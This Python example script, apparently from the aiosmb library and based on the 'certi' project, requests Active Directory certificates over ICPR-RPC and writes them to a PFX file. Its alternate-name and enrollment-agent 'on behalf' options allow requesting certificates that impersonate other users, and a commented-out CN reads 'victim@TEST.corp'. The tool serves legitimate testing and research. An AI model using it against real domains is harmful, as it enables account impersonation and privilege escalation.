
# This example is based on the awesome code of @zer1t0 's certi project
# https://github.com/zer1t0/certi
# 

import asyncio
import traceback
import logging
import os

from aiosmb import logger
from aiosmb._version import __banner__
from aiosmb.commons.connection.url import SMBConnectionURL
from aiosmb.dcerpc.v5.interfaces.icprmgr import ICPRRPC
from aiosmb.dcerpc.v5.connection import DCERPC5Connection
from aiosmb.commons.connection.authbuilder import AuthenticatorBuilder
from aiosmb.dcerpc.v5.common.connection.authentication import DCERPCAuth
from aiosmb.dcerpc.v5.interfaces.endpointmgr import EPM

from msldap.ldap_objects.adcertificatetemplate import EKUS_NAMES
from oscrypto import asymmetric
from csrbuilder import CSRBuilder
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import Encoding, pkcs7, pkcs12, BestAvailableEncryption, load_pem_private_key
from cryptography import x509
from cryptography.x509.oid import ExtensionOID


async def amain(url, service, template, altname, onbehalf, cn = None, pfx_file = None, pfx_password = None, enroll_cert = None, enroll_password = None):
	try:
		if pfx_file is None:
			pfx_file = 'cert_%s.pfx' % os.urandom(4).hex()
		if pfx_password is None:
			pfx_password = 'admin'
		
		print('[+] Parsing connection parameters...')
		su = SMBConnectionURL(url)
		ip = su.get_target().get_hostname_or_ip()

		if cn is None:
			cn = '%s@%s' % (su.username, su.domain)
		
		print('[*] Using CN: %s' % cn)
		print('[+] Building certificate request...')
		attributes = {
			"CertificateTemplate": template,
		}

		public_key, private_key = asymmetric.generate_pair('rsa', bit_size=2048)
		builder = CSRBuilder(
			{
				'common_name': cn, #'victim@TEST.corp', #sorry Will
			},
			public_key
		)
		if altname:
			builder.subject_alt_domains = [altname] # dunno why it's called alt_domains?
		csr = builder.build(private_key).dump()

		if onbehalf is not None:
			agent_key = None
			agent_cert = None
			with open(enroll_cert, 'rb') as f:
				agent_key, agent_cert, _ = pkcs12.load_key_and_certificates(f.read(), enroll_password)
				
			pkcs7builder = pkcs7.PKCS7SignatureBuilder().set_data(csr).add_signer(agent_key, agent_cert, hashes.SHA1())
			csr = pkcs7builder.sign(Encoding.DER, options=[pkcs7.PKCS7Options.Binary])

		
		print('[+] Connecting to EPM...')
		target, err = await EPM.create_target(ip, ICPRRPC().service_uuid)
		if err is not None:
			raise err
		
		print('[+] Connecting to ICRPR service...')
		gssapi = AuthenticatorBuilder.to_spnego_cred(su.get_credential())
		auth = DCERPCAuth.from_smb_gssapi(gssapi)
		connection = DCERPC5Connection(auth, target)
		rpc, err = await ICPRRPC.from_rpcconnection(connection, perform_dummy=True)
		if err is not None:
			raise err
		logger.debug('DCE Connected!')
		
		print('[+] Requesting certificate from the service...')
		res, err = await rpc.request_certificate(service, csr, attributes)
		if err is not None:
			print('[-] Request failed!')
			raise err
		
		
		if res['encodedcert'] in [None, b'']:
			raise Exception('No certificate was returned from server!. Full message: %s' % res)
		
		print('[+] Got certificate!')
		cert = x509.load_der_x509_certificate(res['encodedcert'])
		print("[*]   Cert subject: {}".format(cert.subject.rfc4514_string()))
		print("[*]   Cert issuer: {}".format(cert.issuer.rfc4514_string()))
		print("[*]   Cert Serial: {:X}".format(cert.serial_number))
		
		try:
			ext = cert.extensions.get_extension_for_oid(ExtensionOID.EXTENDED_KEY_USAGE)
			for oid in ext.value:
				print("[*]   Cert Extended Key Usage: {}".format(EKUS_NAMES.get(oid.dotted_string, oid.dotted_string)))
		except:
			print('[-]   Could not verify extended key usage')

		try:
			ext = cert.extensions.get_extension_for_oid(ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
			for name in ext.value.get_values_for_type(x509.OtherName):
				if name.type_id == x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3"):
					print('[*]   Certificate ALT NAME: %s' % name.value)
					break
			else:
				print('[-]   Certificate doesnt have ALT NAME')
		except:
			print('[-]   Certificate doesnt have ALT NAME')
		
		print('[+] Writing certificate to disk (file:"%s" pass: "%s")...' % (pfx_file, pfx_password))
		
		# Still waiting for the day oscrypto will have a pfx serializer :(
		# Until that we'd need to use cryptography
		with open(pfx_file, 'wb') as f:
			data = pkcs12.serialize_key_and_certificates(
				name=b"",
				key=load_pem_private_key(asymmetric.dump_private_key(private_key, None), password=None),
				cert=cert,
				cas=None,
				encryption_algorithm=BestAvailableEncryption(pfx_password.encode())
			)
			f.write(data)

		print('[+] Finished!')
		return True, None
	except Exception as e:
		traceback.print_exc()
		return False, e


def main():
	import argparse

	parser = argparse.ArgumentParser(description='Request certificate via ICPR-RPC service')
	parser.add_argument('-v', '--verbose', action='count', default=0)
	parser.add_argument('--pfx-file', help = 'Output PFX file name. Default is cert_<rand>.pfx')
	parser.add_argument('--pfx-pass', default = 'admin', help = 'Ouput PFX file password')
	parser.add_argument('--alt-name', help = 'Alternate username. Preferable username@FQDN format')
	parser.add_argument('--cn', help = 'CN (common name). In case you want to set it to something custom. Preferable username@FQDN format')
	agentenroll = parser.add_argument_group('Agent enrollment parameters')
	agentenroll.add_argument('--on-behalf', help = 'On behalf username')
	agentenroll.add_argument('--enroll-cert', help = 'Agent enrollment PFX file')
	agentenroll.add_argument('--enroll-pass', help = 'Agent enrollment PFX file password')

	parser.add_argument('smb_url', help = 'Connection string that describes the authentication and target. Example: smb+ntlm-password://TEST\\Administrator:password@10.10.10.2')
	parser.add_argument('service', help = 'Enrollment service endpoint')
	parser.add_argument('template', help = 'Certificate template name to use')
	
	args = parser.parse_args()
	print(__banner__)

	if args.verbose >=1:
		logger.setLevel(logging.DEBUG)

	asyncio.run(
		amain(
			args.smb_url,
			args.service,
			args.template,
			args.alt_name,
			args.on_behalf,
			args.cn,
			args.pfx_file,
			args.pfx_pass,
			args.enroll_cert,
			args.enroll_pass
		)
	)

if __name__ == '__main__':
	main()